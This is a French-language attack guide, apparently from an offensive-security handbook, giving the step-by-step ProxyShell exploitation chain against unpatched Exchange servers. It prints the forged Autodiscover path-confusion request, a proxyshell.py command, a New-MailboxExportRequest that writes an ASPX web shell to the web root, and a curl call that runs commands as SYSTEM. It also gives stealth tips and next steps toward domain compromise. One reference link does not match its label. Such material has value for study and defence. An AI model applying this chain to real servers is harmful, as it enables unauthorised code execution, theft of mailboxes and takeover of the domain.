---
order: 2
title: "ProxyShell : confusion de chemin Autodiscover vers un shell d'export de boîte aux lettres"
description: "La chaîne Exchange pre-authentification qui abuse de la confusion de chemin d'URL d'Autodiscover pour atteindre le back end PowerShell distant sans identifiants, calcule le SID de la boîte aux lettres cible pour construire une session de remoting PowerShell valide, puis exécute New-MailboxExportRequest pour écrire un export de boîte aux lettres sous forme de web shell aspx vers un chemin servi par le web."
keywords:
  - ProxyShell
  - Autodiscover
  - confusion de chemin
  - back end PowerShell
  - New-MailboxExportRequest
---

# ProxyShell

ProxyShell atteint le back end **PowerShell distant** privilégié avec **aucun identifiant**, en abusant de la manière dont le front end analyse le chemin de la requête. Le front end retire un segment de fin qu'il croit être un suffixe de connexion explicite, de sorte qu'une URL embarquant `autodiscover.json` avec un `@` forgé et une requête `Email` est normalisée en une requête que le back end sert comme un appel PowerShell implicitement de confiance et pré-authentifié. Avec PowerShell accessible, vous résolvez le SID de la boîte aux lettres cible, construisez une session de remoting valide en tant que cette boîte aux lettres, et utilisez le cmdlet `New-MailboxExportRequest` pour écrire un export de boîte aux lettres dont le contenu est un web shell ASPX, déposé sous un répertoire servi par le web.

## Prérequis

- La build est antérieure au rollup de sécurité de mi-2021 pour Exchange 2013/2016/2019 (confirmez avec l'[empreinte de version](../enumeration.md)).
- `/autodiscover` et le proxy PowerShell du front end sont accessibles.
- Vous connaissez (ou pouvez découvrir via la même chaîne) une adresse de boîte aux lettres et son DN hérité ; la boîte aux lettres admin est la cible habituelle.

## Étape 1 : confusion de chemin vers le back end PowerShell

L'astuce centrale est une URL que le front end réécrit de sorte que le endpoint PowerShell du back end soit atteint sans authentification. Le `@` scinde l'hôte apparent, et le `Email=autodiscover/autodiscover.json...` fait abandonner au normaliseur le suffixe sensible :

```http
GET /autodiscover/autodiscover.json?@evil.com/powershell/?X-Rps-CAT=<token>&Email=autodiscover/autodiscover.json%3F@evil.com HTTP/1.1
Host: mail.example.com
Connection: close
```

La valeur `X-Rps-CAT` est un jeton d'accès sérialisé nommant l'identité sous laquelle s'exécuter. Un `200` sur cette requête (plutôt qu'une redirection vers `/owa/auth/logon.aspx`) signifie que le endpoint PowerShell du back end a répondu en pre-auth et que la confusion de chemin fonctionne sur cette build. Une redirection de connexion signifie que le suffixe n'a pas été abandonné, donc la build est probablement corrigée.

## Étape 2 : construire une session PowerShell en tant que la cible

Résolvez le SID de la boîte aux lettres cible (la chaîne expose une route `/mapi` ou autodiscover qui renvoie le `LegacyDN` et le SID), puis présentez-le dans le jeton `X-Rps-CAT` afin que la session de remoting s'exécute en tant que cette boîte aux lettres privilégiée. En pratique, un seul outil pilote cela, en gérant le calcul du SID et la construction du jeton :

```bash
# End-to-end: resolve the SID, open the pre-auth PowerShell session, run the export
python3 proxyshell.py -t https://mail.example.com -e administrator@example.com
```

Surveillez la sortie : l'outil affiche le SID résolu, confirme l'ouverture du runspace de remoting, puis émet le cmdlet d'export ci-dessous. S'il cale à « opening runspace », c'est que l'identité `X-Rps-CAT` ne s'est pas résolue, donc fournissez une boîte aux lettres valide que vous avez confirmée lors de l'énumération.

## Étape 3 : exporter une boîte aux lettres dans un web shell

Au sein de la session de remoting, `New-MailboxExportRequest` écrit un PST vers un chemin que vous choisissez, mais un PST avec une charge ASPX embarquée écrit vers un répertoire servi par le web devient un shell. Semez votre propre boîte aux lettres (ou un brouillon) avec l'ASPX, puis exportez-le vers la racine web du proxy :

```powershell
# In the pre-auth PowerShell runspace (run as administrator mailbox)
New-MailboxExportRequest -Mailbox administrator@example.com `
  -FilePath "\\127.0.0.1\C$\inetpub\wwwroot\aspnet_client\shell.aspx"
Get-MailboxExportRequest | Get-MailboxExportRequestStatistics   # wait for Completed
```

Le fichier d'export contient votre ASPX planté. Appelez-le pour confirmer l'exécution de code sous l'identité du pool d'applications/`SYSTEM` :

```bash
curl -sk 'https://mail.example.com/aspnet_client/shell.aspx?c=whoami'
# -> nt authority\system
```

Si l'export est `Completed` mais que le shell renvoie 404, c'est que le PST n'a pas été placé dans un répertoire que le front end sert ; reciblez le `FilePath` sur `aspnet_client`, `owa/auth` ou `ecp/auth` sous la racine web du proxy.

## Variantes et suite

- Le calcul du SID plus PowerShell pre-auth est une primitive générale : au-delà de l'export de boîte aux lettres, le runspace exécute n'importe quel cmdlet Exchange, donc vous pouvez vous octroyer `ApplicationImpersonation` (voir [accès aux boîtes aux lettres](../mailbox-access.md)) au lieu de déposer un shell quand la furtivité importe.
- Certaines builds nécessitent que l'export soit écrit vers un UNC via `127.0.0.1\C$` ; d'autres acceptent directement un chemin local. Essayez les deux.
- La suite est la même que pour tout Exchange `SYSTEM` : récupérer les identifiants et le compte machine, puis atteindre le domaine grâce aux droits AD d'Exchange ou par relais, comme dans la [vue d'ensemble](index.md).

## Notes d'exploitation

- La requête de confusion de chemin est l'étape signature et ce qui casse au correctif ; si elle redirige vers logon, arrêtez et revérifiez la build plutôt que de forcer brutalement les étapes suivantes.
- Exporter vers une racine web est la partie bruyante (elle crée un objet de requête d'export et écrit un fichier conséquent) ; l'option plus discrète consiste à utiliser le runspace pour octroyer l'impersonation et lire le courrier via EWS sans jamais écrire de shell.
- Une adresse de boîte aux lettres valide pilote la résolution du SID, donc un vrai nom issu de la [moisson du GAL](../enumeration.md) rend la chaîne fiable.

## Outils

- **Metasploit** (`exchange_proxyshell_rce`) : module maintenu pilotant les trois étapes.
- **PoC ProxyShell autonomes** : contrôle manuel du SID et du jeton `X-Rps-CAT` pour les builds atypiques.
- **Cmdlets PowerShell distantes Exchange** (`New-MailboxExportRequest`) : la primitive d'écriture du back end.

## Références

- [Google Cloud / Mandiant: PST, want a shell? ProxyShell exploiting Microsoft Exchange](https://cloud.google.com/blog/topics/threat-intelligence/pst-want-shell-proxyshell-exploiting-microsoft-exchange-servers)
- [DEVCORE / Orange Tsai: ProxyShell attack surface, parts 2 and 3](https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/)
- [PeterJson / Jang: reproducing the ProxyShell chain](https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1)
